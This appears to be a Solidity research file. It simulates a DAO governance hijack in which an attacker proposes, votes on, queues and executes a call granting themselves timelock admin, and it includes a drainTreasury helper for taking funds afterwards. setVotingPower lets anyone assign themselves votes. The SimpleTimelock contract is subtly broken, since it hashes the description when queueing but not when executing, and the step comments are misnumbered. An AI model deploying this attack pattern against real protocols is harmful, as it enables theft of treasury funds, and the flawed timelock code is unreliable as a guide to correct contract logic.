// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title GovernanceAttack
 * @notice Simulates a governance hijack via a malicious proposal + timelock.
 *         The attacker submits a proposal that grants TIMELOCK_ADMIN_ROLE to themselves,
 *         queues it, waits, then executes it to seize control of the protocol.
 *         DO NOT use in production. For research only.
 *
 * Attack flow:
 *   1. Attacker deploys malicious contract
 *   2. Submits governance proposal to grant attacker ADMIN role on timelock
 *   3. Votes YES (simulated)
 *   4. Queue → wait for timelock delay
 *   5. Execute → attacker is now TIMELOCK_ADMIN
 */
contract GovernanceAttack {
    // ── Simplified Governor ──────────────────────────────────────────────────

    mapping(bytes32 => Proposal) public proposals;
    mapping(bytes32 => mapping(address => bool)) public votes;
    mapping(address => uint256) public votingPower;

    address public timelock;
    address public governor;
    address public attacker;

    uint256 public constant VOTING_PERIOD = 10; // blocks
    uint256 public constant QUEUE_PERIOD = 5; // blocks

    struct Proposal {
        address target;
        uint256 value;
        bytes data;
        string description;
        uint256 voteStart;
        uint256 voteEnd;
        bool executed;
        bool canceled;
        uint256 forVotes;
        uint256 againstVotes;
        bool queued;
        uint256 queueTime;
    }

    constructor(address _timelock, address _attacker) {
        timelock = _timelock;
        attacker = _attacker;
        governor = address(this);
    }

    // Simulate voting power
    function setVotingPower(address voter, uint256 power) external {
        votingPower[voter] = power;
    }

    /**
     * @notice Step 2: Submit a malicious governance proposal
     */
    function submitProposal(
        address target,
        uint256 value,
        bytes memory data,
        string memory description
    ) external returns (bytes32 proposalId) {
        proposalId = keccak256(abi.encode(target, value, data, description));
        proposals[proposalId] = Proposal({
            target: target,
            value: value,
            data: data,
            description: description,
            voteStart: block.number,
            voteEnd: block.number + VOTING_PERIOD,
            executed: false,
            canceled: false,
            forVotes: 0,
            againstVotes: 0,
            queued: false,
            queueTime: 0
        });
        emit ProposalSubmitted(proposalId, description);
    }

    /**
     * @notice Vote YES on a proposal
     */
    function vote(bytes32 proposalId, bool support) external {
        Proposal storage proposal = proposals[proposalId];
        require(block.number >= proposal.voteStart, "Voting not started");
        require(block.number <= proposal.voteEnd, "Voting ended");
        require(!proposal.executed, "Already executed");
        require(!votes[proposalId][msg.sender], "Already voted");

        uint256 power = votingPower[msg.sender];
        require(power > 0, "No voting power");

        if (support) {
            proposal.forVotes += power;
        } else {
            proposal.againstVotes += power;
        }
        votes[proposalId][msg.sender] = true;
        emit VoteCast(proposalId, msg.sender, support, power);
    }

    /**
     * @notice Step 3: Queue the proposal after voting period
     */
    function queueProposal(bytes32 proposalId) external {
        Proposal storage proposal = proposals[proposalId];
        require(block.number > proposal.voteEnd, "Voting not ended");
        require(proposal.forVotes > proposal.againstVotes, "Proposal defeated");
        require(!proposal.queued, "Already queued");
        proposal.queued = true;
        proposal.queueTime = block.number;
        emit ProposalQueued(proposalId, proposal.queueTime);
    }

    /**
     * @notice Step 5: Execute the proposal — gain admin access
     */
    function executeProposal(bytes32 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.queued, "Not queued");
        require(block.number >= proposal.queueTime + QUEUE_PERIOD, "Timelock not expired");
        require(!proposal.executed, "Already executed");

        proposal.executed = true;

        // Execute the malicious call via timelock
        (bool success, ) = proposal.target.call{value: proposal.value}(proposal.data);
        require(success, "Execution failed");

        emit ProposalExecuted(proposalId);
    }

    // ── Attacker helper ─────────────────────────────────────────────────────

    /**
     * @notice Step 4: After execution, drain the treasury or grant roles
     */
    function drainTreasury(address token, address to, uint256 amount) external {
        require(msg.sender == attacker || msg.sender == address(this), "Not authorized");
        (bool success, ) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        require(success, "Drain failed");
    }

    receive() external payable {}

    event ProposalSubmitted(bytes32 indexed proposalId, string description);
    event VoteCast(bytes32 indexed proposalId, address indexed voter, bool support, uint256 power);
    event ProposalQueued(bytes32 indexed proposalId, uint256 eta);
    event ProposalExecuted(bytes32 indexed proposalId);
}

/**
 * @title SimpleTimelock
 * @notice Minimal timelock controller — execute arbitrary calls after delay.
 */
contract SimpleTimelock {
    mapping(bytes32 => bool) public queuedTransactions;

    uint256 public constant MIN_DELAY = 1; // blocks (shortened for testing)
    address public admin;

    constructor() {
        admin = msg.sender;
    }

    function queueTransaction(
        address target,
        uint256 value,
        bytes memory data,
        string memory description
    ) external returns (bytes32 txHash) {
        require(msg.sender == admin, "Not admin");
        txHash = keccak256(abi.encode(target, value, data, description));
        queuedTransactions[txHash] = true;
        emit QueuedTransaction(txHash, description);
    }

    function executeTransaction(
        address target,
        uint256 value,
        bytes memory data,
        string memory /*description*/
    ) external payable returns (bytes memory) {
        bytes32 txHash = keccak256(abi.encode(target, value, data));
        require(queuedTransactions[txHash], "Not queued");
        queuedTransactions[txHash] = false;
        (bool success, bytes memory returnData) = target.call{value: value}(data);
        require(success, "Tx failed");
        emit ExecutedTransaction(txHash);
        return returnData;
    }

    receive() external payable {}

    event QueuedTransaction(bytes32 indexed txHash, string description);
    event ExecutedTransaction(bytes32 indexed txHash);
}
